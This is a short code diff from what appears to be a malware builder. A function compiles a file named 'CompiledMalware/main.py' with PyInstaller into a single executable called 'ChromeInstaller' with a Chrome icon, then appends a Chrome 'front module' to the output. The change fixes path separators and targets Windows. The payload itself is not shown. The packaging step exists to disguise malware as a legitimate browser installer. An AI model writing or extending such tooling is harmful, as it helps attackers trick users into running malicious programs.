@@ -35,7 +35,8 @@ def SelectModuleFront(selectedModule, file_path, folder_path):
         build_path = os.path.join(folder_path, "build") 
         spec_path = os.path.join(folder_path, "spec") 
         os.makedirs(spec_path, exist_ok=True)
-        CompileCommand = f'pyinstaller --onefile --name="ChromeInstaller" --icon="{os.path.join(BASE_DIR, "ModuleFront\\Chrome\\chrome.ico")}" --distpath="{destination_path}" --workpath="{build_path}" --specpath="{spec_path}" "{os.path.join(BASE_DIR, "CompiledMalware\\main.py")}"'        
+        CompileCommand = f'pyinstaller --onefile --name="ChromeInstaller" --icon="{os.path.join(BASE_DIR, "ModuleFront/Chrome/chrome.ico")}" --distpath="{destination_path}" --workpath="{build_path}" --specpath="{spec_path}" --platform=win_amd64 "{os.path.join(BASE_DIR, "CompiledMalware/main.py")}"'
+        #CompileCommand = f'pyinstaller --onefile --name="ChromeInstaller" --icon="{os.path.join(BASE_DIR, "ModuleFront/Chrome/chrome.ico")}" --distpath="{destination_path}" --workpath="{build_path}" --specpath="{spec_path}" "{os.path.join(BASE_DIR, "CompiledMalware/main.py")}"'        
         file_content = ReadFile(os.path.join(BASE_DIR, "ModuleFront/Chrome/ChromeFrontModule.py"))
         if file_content:
             AppendToFile(file_path, file_content.split("\n"))
